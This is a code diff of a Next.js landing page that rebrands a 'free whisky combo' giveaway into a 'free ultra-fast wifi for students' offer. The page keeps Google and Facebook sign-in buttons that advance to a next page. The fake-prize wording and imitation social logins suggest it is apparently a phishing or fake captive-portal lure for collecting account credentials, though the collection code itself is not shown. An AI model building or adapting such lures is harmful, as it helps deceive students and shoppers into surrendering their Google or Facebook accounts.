@@ -18,27 +18,27 @@ export default function Home() {
     <div className={`${styles.container} ${inter.className}`}>
 
       <div>
-        <Image src="/logo.svg" alt="Peaky Blinders" width={152} height={48} />
+        <Image src="/hero2.png" alt="Wifi Grátis" width={152} height={48} />
       </div>
 
       <div className={styles.form}>
         <div className={styles.form_header}>
-          <Image src="/hero.png" alt="Peaky Blinders" width={540} height={263} />
+          <Image src="/hero.jpg" alt="Wifi Grátis" width={540} height={263} />
         </div>
 
         <div className={styles.form_body}>
           <div className={styles.form_content}>
             <h2 className={averia.className}>
-              Você ganhou um combo de Whisky Grátis em comemoração ao lançamento do filme! Resgate agora!
+            Você ganhou acesso o wifi grátis ultra-rápido exclusivo para alunos!
             </h2>
 
-            <p>Promoção exclusiva para o Shopping Iguatemi São Paulo.</p>
+            <p>Wifi Grátis e exclusivos para alunos.</p>
           </div>
 
           <div className={styles.form_data}>
             <div className={styles.google} onClick={handleNextPage}>
               <div>
-                <Image src="/google.svg" alt="Peaky Blinders" width={24} height={24} />
+                <Image src="/google.svg" alt="Wifi Grátis" width={24} height={24} />
               </div>
 
               <span>
@@ -48,7 +48,7 @@ export default function Home() {
 
             <div className={styles.facebook} onClick={handleNextPage}>
               <div>
-                <Image src="/facebook.svg" alt="Peaky Blinders" width={24} height={24} />
+                <Image src="/facebook.svg" alt="Wifi Grátiss" width={24} height={24} />
               </div>
 
               <span>
@@ -62,7 +62,7 @@ export default function Home() {
 
       <div>
         <span className={styles.copy}>
-          © 2023 Peaky Blinders
+        © 2024 Wifi Grátis de alunos Brasil
         </span>
       </div>
 
